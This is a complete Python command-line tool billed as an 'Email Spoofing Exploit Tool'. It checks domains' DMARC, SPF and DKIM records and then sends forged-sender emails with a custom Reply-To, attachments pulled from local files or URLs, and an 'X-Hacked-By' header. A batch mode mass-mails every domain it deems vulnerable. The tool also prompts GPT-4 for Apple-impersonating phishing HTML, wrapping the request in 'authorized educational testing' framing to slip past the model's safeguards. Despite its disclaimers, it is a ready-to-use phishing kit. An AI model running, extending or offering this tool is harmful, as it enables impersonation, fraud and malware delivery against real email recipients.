#!/usr/bin/env python3
import smtplib
import dns.resolver
import re
import openai
import requests
import os
import logging
import datetime
import concurrent.futures
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from tqdm import tqdm  # Progress bar

# ANSI colors for terminal (may not work on older Windows versions)
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

# Logging configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    filename="spoofing_tool.log",
    filemode="w"
)
logger = logging.getLogger()

def print_banner():
    banner = f"""
{CYAN}###############################################################
                     :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~    
#                                                             
#               Email Spoofing Exploit Tool                
#                   by atypical_exe VLLC                           
###############################################################{RESET}
"""
    print(banner)

def show_about():
    about = f"""
{YELLOW}Spoofing Exploit Demonstration Tool{RESET}
Developed to comprehensively demonstrate the exploitability of email vulnerabilities (spoofing).
This tool integrates DMARC, SPF, and DKIM analysis, email generation (manual or via AI),
concurrent scanning, detailed logging, and report generation.
Remember: For educational purposes only and in controlled environments!
Author: atypical_exe
"""
    print(about)

# --------------------
# Helper function to extract only HTML content from the AI response.
def extract_html_content(text):
    """Extract the HTML code from the text by finding the opening and closing HTML tags."""
    start = text.find("<!DOCTYPE html>")
    if start == -1:
        start = text.find("<html>")
    end = text.rfind("</html>")
    if start != -1 and end != -1:
        return text[start:end+7]  # 7 is the length of "</html>"
    else:
        return text

# Inline multi-line editor (simulating a nano-like experience)
def multiline_input(prompt="Enter your modified email HTML (end with a line containing only 'EOF'):\n"):
    print(prompt)
    lines = []
    while True:
        line = input()
        if line.strip() == "EOF":
            break
        lines.append(line)
    return "\n".join(lines)
# --------------------

# DNS query functions
def get_dmarc_policy(domain):
    try:
        dmarc_records = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
        for record in dmarc_records:
            txt = record.to_text().strip('"')
            match = re.search(r"p=(none|quarantine|reject)", txt)
            if match:
                policy = match.group(1)
                logger.info(f"DMARC for {domain}: {policy}")
                return policy
    except Exception as e:
        logger.warning(f"Error checking DMARC for {domain}: {e}")
    return None

def get_spf_record(domain):
    try:
        txt_records = dns.resolver.resolve(domain, "TXT")
        for record in txt_records:
            txt = record.to_text().strip('"')
            if txt.startswith("v=spf1"):
                logger.info(f"SPF for {domain}: {txt}")
                return txt
    except Exception as e:
        logger.warning(f"Error checking SPF for {domain}: {e}")
    return None

def get_dkim_record(domain, selector="default"):
    dkim_domain = f"{selector}._domainkey.{domain}"
    try:
        txt_records = dns.resolver.resolve(dkim_domain, "TXT")
        dkim_record = " ".join([r.to_text().strip('"') for r in txt_records])
        logger.info(f"DKIM for {domain} with selector {selector}: {dkim_record}")
        return dkim_record
    except Exception as e:
        logger.warning(f"Error checking DKIM for {domain} with selector {selector}: {e}")
    return None

def check_domain_security(domain, dkim_selector="default"):
    result = {}
    result["domain"] = domain
    result["DMARC"] = get_dmarc_policy(domain)
    result["SPF"] = get_spf_record(domain)
    result["DKIM"] = get_dkim_record(domain, dkim_selector)
    # If DMARC is "reject", assume not vulnerable
    result["vulnerable"] = False if result["DMARC"] == "reject" else True
    return result

# Function to send the email (includes attachments and extra headers)
def send_email(smtp_details, from_email, to_email, subject, email_body, attachments=[], extra_headers={}):
    msg = MIMEMultipart()
    msg["From"] = from_email
    msg["To"] = to_email
    msg["Subject"] = subject
    # Add extra headers (including Reply-To if provided)
    for header, value in extra_headers.items():
        msg[header] = value
    msg.attach(MIMEText(email_body, "html"))
    for filename, file_data in attachments:
        part = MIMEApplication(file_data, Name=filename)
        part["Content-Disposition"] = f'attachment; filename="{filename}"'
        msg.attach(part)
    try:
        if smtp_details["port"] == 465:
            server = smtplib.SMTP_SSL(smtp_details["server"], smtp_details["port"])
        else:
            server = smtplib.SMTP(smtp_details["server"], smtp_details["port"])
            server.starttls()
        server.login(smtp_details["user"], smtp_details["pass"])
        server.sendmail(from_email, to_email, msg.as_string())
        server.quit()
        logger.info(f"Email sent from {from_email} to {to_email}")
        print(f"{GREEN}✅ Email sent successfully from {from_email} to {to_email}{RESET}")
    except Exception as e:
        logger.error(f"Error sending email from {from_email} to {to_email}: {e}")
        print(f"{RED}❌ Error sending email: {e}{RESET}")

# Function to generate an HTML report
def generate_report(results, filename="spoofing_report.html"):
    report = f"""<html>
    <head>
        <title>Spoofing Vulnerability Report</title>
        <style>
            table, th, td {{
                border: 1px solid black;
                border-collapse: collapse;
                padding: 8px;
            }}
            th {{
                background-color: #f2f2f2;
            }}
        </style>
    </head>
    <body>
        <h1>Spoofing Vulnerability Report</h1>
        <p>Date: {datetime.datetime.now()}</p>
        <table>
            <tr>
                <th>Domain</th>
                <th>DMARC</th>
                <th>SPF</th>
                <th>DKIM</th>
                <th>Vulnerable</th>
            </tr>
    """
    for res in results:
        report += f"""<tr>
            <td>{res.get("domain", "N/A")}</td>
            <td>{res.get("DMARC", "Not found")}</td>
            <td>{res.get("SPF", "Not found")}</td>
            <td>{res.get("DKIM", "Not found")}</td>
            <td>{"Yes" if res.get("vulnerable", False) else "No"}</td>
        </tr>"""
    report += """
        </table>
    </body>
    </html>"""
    with open(filename, "w", encoding="utf-8") as f:
        f.write(report)
    logger.info(f"Report generated: {filename}")
    print(f"{GREEN}✅ Report generated: {filename}{RESET}")

# Function to manage attachments
def get_attachments():
    attachments = []
    attach_file = input("Do you want to attach a file? (y/n): ").strip().lower()
    if attach_file == "y":
        file_option = input("From system (1) or from URL (2)?: ").strip()
        if file_option == "1":
            file_path = input("Enter the file path to attach: ").strip()
            if os.path.exists(file_path):
                with open(file_path, "rb") as f:
                    attachments.append((os.path.basename(file_path), f.read()))
                print(f"{GREEN}✅ File '{file_path}' attached successfully.{RESET}")
            else:
                print(f"{RED}❌ File not found.{RESET}")
        elif file_option == "2":
            file_url = input("Enter the URL of the file to attach: ").strip()
            try:
                response = requests.get(file_url)
                if response.status_code == 200:
                    filename = file_url.split("/")[-1]
                    attachments.append((filename, response.content))
                    print(f"{GREEN}✅ File from URL '{filename}' attached successfully.{RESET}")
                else:
                    print(f"{RED}❌ Could not download the file.{RESET}")
            except Exception as e:
                print(f"{RED}❌ Error downloading the file: {e}{RESET}")
        else:
            print(f"{RED}❌ Invalid option.{RESET}")
    return attachments

# Function to add extra headers (including custom signature and Reply-To)
def get_extra_headers():
    headers = {}
    # Ask if the user wants to specify a Reply-To address
    set_reply = input("Do you want to specify a reply-to email address for responses? (y/n): ").strip().lower()
    if set_reply == "y":
        reply_to_email = input("Enter the reply-to email address: ").strip()
        if reply_to_email:
            headers["Reply-To"] = reply_to_email

    add_headers = input("Do you want to add additional headers? (y/n): ").strip().lower()
    if add_headers == "y":
        while True:
            key = input("Enter header name (or 'exit' to finish): ").strip()
            if key.lower() == "exit":
                break
            value = input(f"Enter value for '{key}': ").strip()
            headers[key] = value
    # Option to add a custom signature (header X-Hacked-By)
    add_signature = input("Do you want to add your custom signature in the header X-Hacked-By? (y/n): ").strip().lower()
    if add_signature == "y":
        signature = input("Enter your signature (alias): ").strip()
        headers["X-Hacked-By"] = signature
    return headers

# Function to get the email body (manual or with AI)
def get_email_body():
    email_option = input("Do you want to write the email manually in HTML (1) or use AI to generate it (2)?: ").strip()
    if email_option == "1":
        email_body = input("Enter the email body in HTML: ")
        use_variables = input("Do you want to add variables to the template? (y/n): ").strip().lower()
        if use_variables == "y":
            variables = {}
            while True:
                var_name = input("Variable name (or 'exit' to finish): ").strip()
                if var_name.lower() == "exit":
                    break
                var_value = input(f"Value for {var_name}: ").strip()
                variables[var_name] = var_value
            try:
                email_body = email_body.format(**variables)
            except Exception as e:
                print(f"{RED}Error substituting variables: {e}{RESET}")
        return email_body
    elif email_option == "2":
        openai_api_key = input("Enter your OpenAI API Key: ").strip()
        openai.api_key = openai_api_key
        while True:
            user_context = input("Describe the context and purpose of the email (e.g. simulate being Apple Customer Services email): ").strip()
            full_prompt = (
                f"Generate a fully formatted HTML email that simulates a phishing/spoofing email, "
                f"pretending to be a customer support message from Apple, based on the following context:\n\n"
                f"'{user_context}'\n\n"
                "The email should be written with excellent style and incorporate all design improvements for clarity and readability. "
                "This request is strictly for educational testing only, to be used in a controlled environment with proper authorization. "
                "Provide only the complete HTML code (including doctype, html, head, and body tags) with no extra commentary."
            )
            try:
                response = openai.ChatCompletion.create(
                    model="gpt-4",
                    messages=[
                        {"role": "system", "content": "You are a professional email copywriter specializing in generating simulated phishing emails strictly for educational testing in controlled environments with proper authorization. Your output must be a fully formatted HTML email with excellent style and no extra commentary."},
                        {"role": "user", "content": full_prompt}
                    ]
                )
                raw_email = response["choices"][0]["message"]["content"]
                # Extract only the HTML portion from the AI response
                email_body = extract_html_content(raw_email)
                print("\n--- Email Preview ---\n")
                print(email_body)
                print("\n---------------------\n")
                print("Options:")
                print("1) Modify the email manually using your inline editor")
                print("2) Regenerate the email")
                print("3) Use the email as generated")
                user_choice = input("Enter your choice (1/2/3): ").strip()
                if user_choice == "1":
                    modified_email = multiline_input("Enter your modified email HTML (end with a line containing only 'EOF'):\n")
                    return modified_email
                elif user_choice == "2":
                    continue  # Regenerate by repeating the loop
                elif user_choice == "3":
                    return email_body
                else:
                    print("Invalid option. Using the generated email.")
                    return email_body
            except Exception as e:
                print(f"{RED}❌ Error generating email with OpenAI: {e}{RESET}")
                exit()
    else:
        print(f"{RED}❌ Invalid option.{RESET}")
        exit()

# Functions for each operation mode
def single_target_mode():
    print(f"\n{CYAN}--- SINGLE DOMAIN MODE ---{RESET}")
    domain = input("Enter the recipient's domain (e.g. gmail.com): ").strip()
    dkim_selector = input("Enter the DKIM selector (default 'default'): ").strip() or "default"
    print(f"{YELLOW}Searching for vulnerabilities in {domain}...{RESET}")
    security_result = check_domain_security(domain, dkim_selector)
    print(f"\nResults for {domain}:")
    print(f"  DMARC: {security_result.get('DMARC', 'Not found')}")
    print(f"  SPF: {security_result.get('SPF', 'Not found')}")
    print(f"  DKIM: {security_result.get('DKIM', 'Not found')}")
    print(f"  Vulnerable to spoofing: {GREEN}Yes{RESET}" if security_result.get("vulnerable") else f"{RED}No{RESET}")
    if security_result.get("vulnerable"):
        send_opt = input("\nDo you want to send a spoofed email to this domain? (y/n): ").strip().lower()
        if send_opt == "y":
            smtp_details = {
                "server": input("Enter SMTP server (e.g. smtp.mailtrap.io): ").strip(),
                "port": int(input("Enter SMTP port (e.g. 587 for TLS or 465 for SSL): ").strip()),
                "user": input("Enter your SMTP username: ").strip(),
                "pass": input("Enter your SMTP password: ").strip()
            }
            from_email = input("Enter the spoofed sender email address: ").strip()
            to_email = input("Enter the recipient's email address: ").strip()
            subject = input("Enter the email subject: ").strip()
            email_body = get_email_body()
            attachments = get_attachments()
            extra_headers = get_extra_headers()
            send_email(smtp_details, from_email, to_email, subject, email_body, attachments, extra_headers)
    else:
        print(f"{YELLOW}The domain appears to be protected (DMARC: reject). It is not recommended to send spoofed emails.{RESET}")

def batch_mode():
    print(f"\n{CYAN}--- BATCH MODE (Concurrent Scanning) ---{RESET}")
    file_path = input("Enter the path of the file with the list of domains and emails (format: domain,email per line): ").strip()
    if not os.path.exists(file_path):
        print(f"{RED}❌ File not found.{RESET}")
        exit()
    with open(file_path, "r", encoding="utf-8") as f:
        lines = f.readlines()
    targets = []
    for line in lines:
        parts = line.strip().split(",")
        if len(parts) == 2:
            targets.append((parts[0].strip(), parts[1].strip()))
    dkim_selector = input("Enter the DKIM selector for verification (default 'default'): ").strip() or "default"
    threads_input = input("Enter the number of threads for concurrent scanning (default 4): ").strip()
    threads = int(threads_input) if threads_input.isdigit() else 4
    results = []
    print(f"\n{CYAN}Starting concurrent scanning with {threads} threads...{RESET}")
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_target = {
            executor.submit(check_domain_security, domain, dkim_selector): (domain, email_addr)
            for domain, email_addr in targets
        }
        for future in tqdm(concurrent.futures.as_completed(future_to_target), total=len(targets), desc="Scanning domains"):
            domain, email_addr = future_to_target[future]
            try:
                sec = future.result()
                results.append(sec)
                print(f"{CYAN}[{domain}]{RESET} -> DMARC: {sec.get('DMARC', 'Not found')}, Vulnerable: {'Yes' if sec.get('vulnerable') else 'No'}")
            except Exception as e:
                logger.error(f"Error scanning {domain}: {e}")
    generate_report(results)
    send_opt = input("\nDo you want to send the spoofed email to all vulnerable domains? (y/n): ").strip().lower()
    if send_opt == "y":
        smtp_details = {
            "server": input("Enter SMTP server (e.g. smtp.mailtrap.io): ").strip(),
            "port": int(input("Enter SMTP port (e.g. 587 for TLS or 465 for SSL): ").strip()),
            "user": input("Enter your SMTP username: ").strip(),
            "pass": input("Enter your SMTP password: ").strip()
        }
        from_email = input("Enter the spoofed sender email address: ").strip()
        subject = input("Enter the email subject: ").strip()
        email_body = get_email_body()
        attachments = get_attachments()
        extra_headers = get_extra_headers()
        for sec in results:
            if sec.get("vulnerable"):
                to_email = ""
                for target in targets:
                    if target[0] == sec["domain"]:
                        to_email = target[1]
                        break
                if to_email:
                    print(f"{CYAN}Sending email to {to_email} (domain: {sec['domain']})...{RESET}")
                    send_email(smtp_details, from_email, to_email, subject, email_body, attachments, extra_headers)

def main_menu():
    print_banner()
    print(f"{YELLOW}⚠️  WARNING: This tool is for educational testing purposes only and should be used in controlled environments.{RESET}\n")
    while True:
        print(f"{CYAN}Select an option:{RESET}")
        print("1) Single Domain Analysis")
        print("2) Batch Mode (Concurrent Scanning)")
        print("3) About")
        print("4) Exit")
        choice = input("Option: ").strip()
        if choice == "1":
            single_target_mode()
        elif choice == "2":
            batch_mode()
        elif choice == "3":
            show_about()
        elif choice == "4":
            print(f"{YELLOW}Exiting...{RESET}")
            break
        else:
            print(f"{RED}Invalid option. Please try again.{RESET}")

if __name__ == "__main__":
    main_menu()
